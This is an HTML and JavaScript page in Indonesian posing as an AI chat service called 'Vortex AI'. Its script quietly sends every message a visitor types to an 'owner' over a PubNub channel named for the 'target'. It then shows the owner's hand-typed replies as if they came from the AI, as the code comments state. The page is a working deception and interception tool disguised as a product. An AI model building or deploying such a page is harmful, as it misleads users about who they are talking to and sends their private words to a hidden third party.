<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vortex AI - Future Intelligence</title>
    <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
    <style>
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: #e9edef; display: flex; flex-direction: column; height: 100vh; }
        header { background: #202c33; padding: 15px; text-align: center; font-weight: bold; border-bottom: 1px solid #3b4a54; color: #00a884; }
        #chat-box { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 10px; }
        .msg { max-width: 80%; padding: 10px 15px; border-radius: 10px; font-size: 0.95rem; }
        .ai { align-self: flex-start; background: #202c33; }
        .user { align-self: flex-end; background: #005c4b; }
        .input-area { background: #202c33; padding: 15px; display: flex; gap: 10px; }
        input { flex: 1; background: #2a3942; border: none; padding: 12px; border-radius: 8px; color: white; outline: none; }
        button { background: #00a884; border: none; color: white; padding: 0 20px; border-radius: 8px; cursor: pointer; }
    </style>
</head>
<body>
<header>VORTEX AI v5.0 (ONLINE)</header>
<div id="chat-box"></div>
<div class="input-area">
    <input type="text" id="userInput" placeholder="Tanyakan sesuatu..." onkeypress="if(event.key==='Enter')sendMessage()">
    <button onclick="sendMessage()">Kirim</button>
</div>

<script>
    const pubnub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: 'target_node' });
    const chatBox = document.getElementById('chat-box');

    // 1. DENGARKAN PESAN DARI OWNER
    pubnub.subscribe({ channels: ['vortex_owner_to_target'] });
    pubnub.addListener({
        message: function(m) {
            addMsg(m.message, 'ai'); // Pesan dari kamu muncul sebagai "AI" di layar target
        }
    });

    function sendMessage() {
        const input = document.getElementById('userInput');
        const text = input.value.trim();
        if (!text) return;

        addMsg(text, 'user');
        input.value = '';

        // KIRIM KE OWNER
        pubnub.publish({
            channel: 'vortex_target_to_owner',
            message: { msg: text, time: new Date().toLocaleTimeString() }
        });
    }

    function addMsg(text, type) {
        const div = document.createElement('div');
        div.className = `msg ${type}`;
        div.innerText = text;
        chatBox.appendChild(div);
        chatBox.scrollTop = chatBox.scrollHeight;
    }
</script>
</body>
</html>
